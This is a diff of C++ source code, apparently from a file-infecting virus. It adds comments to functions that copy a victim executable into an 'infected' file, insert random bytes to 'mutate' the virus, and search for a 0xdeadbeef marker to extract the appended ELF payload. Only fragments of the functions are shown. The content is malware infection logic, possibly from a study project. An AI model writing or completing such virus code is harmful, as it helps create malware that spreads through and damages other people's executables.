@@ -56,7 +56,8 @@ bool infect(string& virusPath, string& infectedPath, string& victimPath){
     }
 
     u_int64_t debug = 0;
-    
+
+    //adding random bytes to "mutate" the virus
     srand(time(0));
 
     for(int i = 0; i < 4; i++){
@@ -65,12 +66,14 @@ bool infect(string& virusPath, string& infectedPath, string& victimPath){
     }
 
     while(!(feof(victimFile))){
+        //read byte into byteC
         debug = fread(&byteC, 1, 1, victimFile);
         if(debug != 1 && debug != 0){
             cout<<"bad fread\n";
             cout<<debug<<"\n";
             break;
         }
+        //write byteC into infectedFile
         debug = fwrite(&byteC, 1, 1, infectedFile);
         if(debug != 1 && debug != 0){
             cout<<"bad fread\n";
@@ -115,6 +118,7 @@ bool makeTmp (const string& f1, const string& f2){
     u_int64_t debug = 0;
     while((br = fread(&bc, 1, 1, rfile))==1){
         //printf("Read byte: 0x%02x\n", bc);
+        //Searching for marker 0xdeadbeef, stop reading if marker is found
         if(!found){
             switch(marker){
                 case 0:
@@ -131,6 +135,7 @@ bool makeTmp (const string& f1, const string& f2){
                 case 3:
                     cout<<marker<<"\n";
                     if(bc == 0xef){marker++; found = true;
+                        //skipping random bytes after marker to get to the ELF marker
                         while (1){
                             debug = fread(&bc, 1, 1, rfile);
                             //printf("reading byte: 0x%02x\n", bc);
@@ -152,7 +157,7 @@ bool makeTmp (const string& f1, const string& f2){
         }
         if(found){
             
-            //
+            //write everything after the marker is found
             if (fwrite(&bc, 1, 1, hostx) != 1) {
                 cerr << "Error writing to " << f2 << "\n";
                 fclose(rfile);
